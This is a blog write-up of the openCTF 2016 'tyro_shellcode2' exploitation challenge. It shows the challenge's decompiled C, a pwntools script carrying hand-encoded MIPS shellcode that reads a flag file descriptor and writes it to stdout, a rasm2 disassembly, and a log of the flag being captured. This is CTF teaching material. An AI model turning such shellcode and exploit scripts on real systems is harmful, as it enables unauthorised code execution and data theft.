---
layout: post
title: openCTF 2016 - tyro_shellcode2
category: [Exploitation]
tags: [Exploitation, openCTF]
comments: true
---

**Points:** 100
**Solves:** 
**Category:** Exploitation
**Description:** Baby's first second problem, welcome to a beautiful risc architecture called MIPS.
Server: 172.31.1.44:1615
Binary: 172.31.0.10/tyro_shellcode2_53af42a29d43eff55ff3adba4cf67069

> [tyro_shellcode2]({{site.url}}/assets/tyro_shellcode2_53af42a29d43eff55ff3adba4cf67069)

This challenge is absolutely the same as [tyro_shellcode1]({{site.url}}/exploitation/2016/08/05/openCTF-tyro_shellcode.html) but compiled for MIPS architecture.

{% highlight C %}
int main() {
    flagFileDesc = open("/home/challenge/flag", 0x0);
    setbuf(STDIN, 0x0);
    setbuf(STDOUT, 0x0);
    alarm(30);
    
    mmap_addr = mmap(0x0, 0x80, 0x7, 0x22, 0xffffffff, 0x0);
    memset(mmap_addr, 0xc3, 127);   // this time 0xc3 doesn't mean RET :P
    memset(localBuffer, 0x0, 127);
    
    puts("OpenCTF tyro shellcode challenge.\n");
    puts("Write me some shellcode that reads from the file_descriptor");
    puts("I supply and writes it to the buffer that I supply");
    printf("%d ... 0x%08x\n", "I supply and writes it to the buffer that I supply", flagFileDesc, mmap_addr);

    read(0x0, mmap_addr, 0x20);

    ret = mmap_addr();

    puts(localBuffer);

    edx = canary ^ *0x14;
    COND = edx == 0x0;
    if (!COND) {
            eax = __stack_chk_fail();
    }
    return ret;
}

{% endhighlight %}

# Solution

This time around I will do read/write syscalls with static buffer address located in the .bss section.

{% highlight python %}
#!/usr/bin/env python

from pwn import *
import sys

def sh():
    a = ('24020fa3').decode('hex')  # v0 = 3
    b = ('24040003').decode('hex')  # a0 = 3
    c = ('24060040').decode('hex')  # a2 = 0x40
    d = ('3c05004a').decode('hex')  # a1 == addr 0x4a 5cd0
    e = ('34a55cd0').decode('hex')  # a1 == addr
    f = ('0000000c').decode('hex')  # syscall
    g = ('24040001').decode('hex')  # a0 = 3
    h = ('24020fa4').decode('hex')  # v0 = 4004
    i = ('3c05004a').decode('hex')  # a1 = addr
    j = ('34a55cd0').decode('hex')  # a1 = addr
    k = ('24060040').decode('hex')  # a2 = 0x40
    l = ('0000000c').decode('hex')  # syscall

    return a + b + c + d + e + f + g + h + i + j + k + l

def exploit(r):
    r.recvuntil(' ... ')
    addr = int(r.recv(10), 16)
    log.info("Addr is at: " + hex(addr))

    fout = open('shellcode', 'w')
    fout.write(sh())
    fout.close()

    r.send(sh())
    r.interactive()



if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['/vagrant/openCTF/tyro_shellcode1_84536cf714f0c7cc4786bb226f3a866c'])
        print util.proc.pidof(r)
        pause()
        exploit(r)
{% endhighlight %}

Sorry about not writing MIPS assembly but it appears I haven't compiled pwntools/binutils with mips support. Instead I had to manually use rasm2 as assembler/disassembler.

The disassembly of the shellcode can be achieved with `rasm2 -a mips -b 32 -e -d '24020fa3'`...:

{% highlight text %}
addiu v0, zero, 0xfa3   # read syscall num
addiu a0, zero, 3       # file descriptor
addiu a2, zero, 0x40    # size to read
lui a1, 0x4a            # .bss static addr 0x4a5cd0
ori a1, a1, 0x5cd0
syscall
addiu a0, zero, 1       # file descriptor for write
addiu v0, zero, 0xfa4   # write syscall
lui a1, 0x4a            # .bss static addr 0x4a5cd0
ori a1, a1, 0x5cd0
addiu a2, zero, 0x40    # size to write
syscall
{% endhighlight %}

The assembly is just as simple `rasm2 -a mips -b 32 -e 'addiu v0, zero,4003'`.

{% highlight text %}
➜  openCTF rasm2 -a mips -b 32 -e 'addiu v0, zero,4003'
24020fa3
➜  openCTF
{% endhighlight %}

Few things to pay attention to:

* MIPS is big endien
* Rasm2 assemble syntax takes different syntax from what u see in IDA. Most of the time it will be 3 operands. So `addiu v0, zero, 0xfa3` == `li v0, 0xfa3` but the second syntax won't assemble for whatever reason :(.
* Syscall number goes in v0
* Arguments go in a0, a1, a2....
* `lui a1, 0x4a` moves 0x4a in the high order 2 bytes of 32bit register a1
* `ori a1, a1, 0x5cd0` does a logical OR of low order 2 bytes of a1 with 0x5cd0

{% highlight text %}
openCTF python ./shellcode2.py 172.31.1.44 1615
[*] For remote: ./shellcode2.py HOST PORT
[+] Opening connection to 172.31.1.44 on port 1615: Done
[*] Addr is at: 0x76fffce0
[*] Switching to interactive mode

itsa_beeet_different_but_stilltheSAME
qemu: uncaught target signal 11 (Segmentation fault) - core dumped
/home/challenge/qemu-wrapper.sh: line 2: 29407 Segmentation fault      
(core dumped) qemu-mips /home/challenge/tyro_shellcode2
[*] Got EOF while reading in interactive
$
{% endhighlight %}